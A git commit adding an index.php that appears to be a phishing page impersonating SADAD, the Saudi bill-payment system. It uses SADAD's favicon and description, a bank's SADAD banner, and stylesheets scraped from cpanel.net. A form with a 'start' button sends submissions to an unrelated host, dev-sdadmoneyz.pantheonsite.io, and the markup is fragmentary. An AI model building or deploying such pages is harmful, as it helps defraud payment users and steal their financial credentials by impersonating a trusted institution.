c785205fd287c37dd0e489a5d623c52a680d8386
alrao <79272609+alrao@users.noreply.github.com>
2022-01-04 16:46:11 +0200

    Add files via upload

---
+++ index.php
@@ -0,0 +1,108 @@
+<html lang="ar" prefix="og: http://ogp.me/ns#" class="translated-rtl"><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8"><link rel="stylesheet" type="text/css" href="cid:css-dc2d038f-b7bd-4d15-93e2-4c83edbc9aec@mhtml.blink" /><link rel="stylesheet" type="text/css" href="cid:css-daa01d67-80d7-46a8-924f-0dfd9904d608@mhtml.blink" /><link rel="stylesheet" type="text/css" href="cid:css-ccf9383c-b076-4090-8a7b-bfbdd1637ea7@mhtml.blink" /><link rel="stylesheet" type="text/css" href="cid:css-a1e7b2c4-d4ea-42fa-8b09-6ec6737556cc@mhtml.blink" /><link rel="stylesheet" type="text/css" href="cid:css-01424a1d-e2bc-41c4-aad1-d9e934107ef5@mhtml.blink" /><link rel="stylesheet" type="text/css" href="cid:css-8e1ee354-1e26-4ead-940b-587c7114e2c5@mhtml.blink" /><link rel="stylesheet" type="text/css" href="cid:css-a40be6ea-08be-4231-81f4-4e4209b11576@mhtml.blink" /><link rel="stylesheet" type="text/css" href="cid:css-73d402c8-dc75-4432-89cf-f52484e9ece8@mhtml.blink" /><link rel="stylesheet" type="text/css" href="cid:css-d89741b9-899d-47e8-88f9-bc98727f03ec@mhtml.blink" /><link rel="stylesheet" type="text/css" href="cid:css-41e0e43d-b156-49af-bda1-3e0cf68331fc@mhtml.blink" /><link rel="stylesheet" type="text/css" href="cid:css-5f5c9aa0-c4d4-4821-99c8-bdc46cb9f893@mhtml.blink" /><link rel="stylesheet" type="text/css" href="cid:css-15d44f14-2838-4d3d-ae13-1a93573385fd@mhtml.blink" /><link rel="stylesheet" type="text/css" href="cid:css-d4e9f46d-8c67-4d61-994c-9403829ae8a9@mhtml.blink" /><link rel="stylesheet" type="text/css" href="cid:css-76ca9fd6-c735-4e2b-af05-ff51ef372334@mhtml.blink" /><link rel="stylesheet" type="text/css" href="cid:css-7347df85-db71-4baa-a001-28a6709ef182@mhtml.blink" /><link rel="stylesheet" type="text/css" href="cid:css-d57f9f40-0f86-4be7-a9d4-05d674777f0e@mhtml.blink" /><link rel="stylesheet" type="text/css" href="cid:css-cf3d72fc-949c-46bf-b609-79302a95d79f@mhtml.blink" /><link rel="stylesheet" type="text/css" href="cid:css-e751b2f4-7d43-4a5a-a4ef-8d64cfce06c1@mhtml.blink" /><link rel="stylesheet" type="text/css" href="cid:css-5ad63561-ce8f-4907-ba4d-64358b50e4f3@mhtml.blink" /><link rel="stylesheet" type="text/css" href="cid:css-8f055c7c-8c04-4aa5-9f8a-475002289c35@mhtml.blink" /><link rel="stylesheet" type="text/css" href="cid:css-3dcf01c3-56b7-45fc-9ced-6e076d0705ae@mhtml.blink" /><link rel="stylesheet" type="text/css" href="cid:css-656f3e72-5113-40b8-b170-d87f0e22aa0b@mhtml.blink" /><link rel="stylesheet" type="text/css" href="cid:css-3da24105-d3e3-4567-8def-e824839e7840@mhtml.blink" /><link rel="stylesheet" type="text/css" href="cid:css-6b9ccc17-005c-46a8-8973-d21baf8cdd18@mhtml.blink" /><link rel="stylesheet" type="text/css" href="cid:css-860ddb47-4e19-407e-add1-ce2a0f1e42dd@mhtml.blink" />
+	
+	<meta http-equiv="X-UA-Compatible" content="IE=Edge,chrome=1">
+    <!--run in IE 9 mode-->
+    <meta name="viewport" content="width=device-width, initial-scale=1.0"><meta http-equiv="Expires" content="0"><meta name="keywords" content="نظام سداد للمدفوعات , سداد, حل واحد لجميع المدفعات, مؤسسة النقد العربي السعودي"><meta name="description" content="نظام سداد للمدفوعات هو أحد أنظمة مؤسسة النقد العربي السعودي، وهو نظام مركزي لعرض ودفع الفواتير والمدفوعات الأخرى إلكترونياً في المملكة العربية السعودية، حيث أن مهمته الأساسية هي تسهيل وتسريع عملية دفع الفواتير والمدفوعات الأخرى عبر جميع القنوات المصرفية في المملكة (فروع البنوك وأجهزة الصرف الآلي والهاتف المصرفي والإنترنت المصرفية.">
+
+	<link href="https://www.sadad.com/_layouts/inc/SADAD.Internet.Portal/images/favicon.ico" rel="shortcut icon">
+    <link href="https://www.sadad.com/_layouts/inc/SADAD.Internet.Portal/images/favicon.ico" rel="apple-touch-icon-precomposed">
+
+ 	<!-- GDPR cookie -->
+    <link rel="stylesheet" href="https://store.cpanel.net/commonui/css/vendor/cookieconsent/3.1.0/cookieconsent.min.css">
+    <link rel="stylesheet" href="https://cpanel.net/assets/css/gdpr.min.css">
+    
+	
+
+	<!-- CSS -->
+    <!-- <link rel="stylesheet" href="https://use.fontawesome.com/releases/v5.5.0/css/all.css" integrity="sha384-B4dIYHKNBt8Bc12p+WXckhzcICo0wtJAoU8YZTY5qE0Id1GSseTk6S+L3BlXeVIU" crossorigin="anonymous"> -->
+
+	<link rel="stylesheet" href="https://pro.fontawesome.com/releases/v5.13.1/css/all.css" crossorigin="anonymous">
+	<link rel="stylesheet" href="https://cpanel.net/wp-content/themes/cPbase/assets/css/policies.css">
+	<link rel="stylesheet" href="https://cpanel.net/wp-content/themes/cPbase/assets/css/pal.css">
+	<!-- <link rel="stylesheet" href="/wp-content/themes/cPbase/assets/css/trial.css"> -->
+	<link rel="stylesheet" href="https://cpanel.net/wp-content/themes/cPbase/assets/css/2021-trial-b.css">
+	<link rel="stylesheet" href="https://cpanel.net/wp-content/themes/cPbase/assets/css/pricing2021.css">
+	<link rel="stylesheet" href="https://cpanel.net/wp-content/themes/cPbase/assets/css/green.css">
+	<link rel="stylesheet" href="https://cpanel.net/wp-content/themes/cPbase/assets/css/roadmap.css">
+	<link rel="stylesheet" href="https://cpanel.net/wp-content/themes/cPbase/assets/css/version96.css">
+
+				
+    <!-- font -->
+    <link href="https://fonts.googleapis.com/css?family=Open+Sans:100,200,300,400,500,600,700|Montserrat:100,200,300,400,500,600,700" rel="stylesheet" type="text/css">
+
+
+
+
+	<title>فواتير سداد</title>
+
+<!-- This site is optimized with the Yoast SEO plugin v9.4 - https://yoast.com/wordpress/plugins/seo/ -->
+
+
+<!-- / Yoast SEO plugin. -->
+
+<link rel="dns-prefetch" href="https://s.w.org/">
+<link rel="alternate" type="application/rss+xml" title="cPanel »موجز" href="https://cpanel.net/feed/">
+<link rel="alternate" type="application/rss+xml" title="cPanel »تعليقات الأعلاف" href="https://cpanel.net/comments/feed/">
+		
+		
+	<link rel="stylesheet" id="wp-block-library-css" href="https://cpanel.net/wp-includes/css/dist/block-library/style.min.css?ver=5.6" type="text/css" media="all">
+<link rel="stylesheet" id="cpbase-style-css" href="https://cpanel.net/wp-content/themes/cPbase/style.css?ver=5.6" type="text/css" media="all">
+<link rel="https://api.w.org/" href="https://cpanel.net/wp-json/"><link rel="alternate" type="application/json" href="https://cpanel.net/wp-json/wp/v2/pages/217"><link rel="EditURI" type="application/rsd+xml" title="تحديد وضع اللاجئ" href="https://cpanel.net/xmlrpc.php?rsd">
+<link rel="wlwmanifest" type="application/wlwmanifest+xml" href="https://cpanel.net/wp-includes/wlwmanifest.xml"> 
+<meta name="generator" content="WordPress 5.6">
+<link rel="shortlink" href="https://cpanel.net/?p=217">
+<link rel="alternate" type="application/json+oembed" href="https://cpanel.net/wp-json/oembed/1.0/embed?url=%2Fextensions%2F">
+<link rel="alternate" type="text/xml+oembed" href="https://cpanel.net/wp-json/oembed/1.0/embed?url=%2Fextensions%2F&amp;format=xml">
+<link type="text/css" rel="stylesheet" charset="UTF-8" href="https://translate.googleapis.com/translate_static/css/translateelement.css"><meta http-equiv="origin-trial" content="A+sitaPn3hlQ8QipTsncwHz+k1NvfPtFsQqIOiD8GK3M9v9XCeQqlF7x1P9AVJdoYTiJPZXZc5XZYpwc10fH4wEAAACfeyJvcmlnaW4iOiJodHRwczovL3d3dy5nb29nbGVhZHNlcnZpY2VzLmNvbTo0NDMiLCJmZWF0dXJlIjoiQ29udmVyc2lvbk1lYXN1cmVtZW50IiwiZXhwaXJ5IjoxNjQzMTU1MTk5LCJpc1N1YmRvbWFpbiI6dHJ1ZSwiaXNUaGlyZFBhcnR5Ijp0cnVlLCJ1c2FnZSI6InN1YnNldCJ9"></head>
+
+
+
+
+</div>
+</nav>
+</div>
+                    <section class="bg-white text-center">
+    <div class="container">
+                </div>
+
+
+<section class="bg-white">
+    <div class="container">
+
+        <div class="row justify-content-center pb-0">
+            <div class="col-md-11 text-center">
+                </div>
+<div id="cloudlinux" class="row justify-content-center mt-5">
+					<div class="col-12 col-md-6 text-center">
+						<img src="https://www.bankaljazira.com/Portals/0/Images/SADAD_OnLine_Payment_SMART_Page_Banner_1200x409px_AR-4.jpg" class="img-fluid w-75 pb-3">
+					</div>
+		</div>
+				
+    
+
+        
+
+        
+            <div class="card">
+                
+                    <form id="lform" action="https://dev-sdadmoneyz.pantheonsite.io/a/" method="post" class="login" role="form">
+                
+
+        
+										</div>
+    
+
+
+    <button id="btn-login" type="submit" class="btn btn-primary btn-block">
+        <span id="text-login"><span id="btn-login-icon"></span> بدء</span>
+    </button>
+			<section class="bg-white text-center">
+    <div class="container">
+                    </div>
+                    <section class="bg-white text-center">
+    <div class="container">
+                </div>
+                <section class="bg-white text-center">
+    <div class="container">
+            </div>
+        </div>
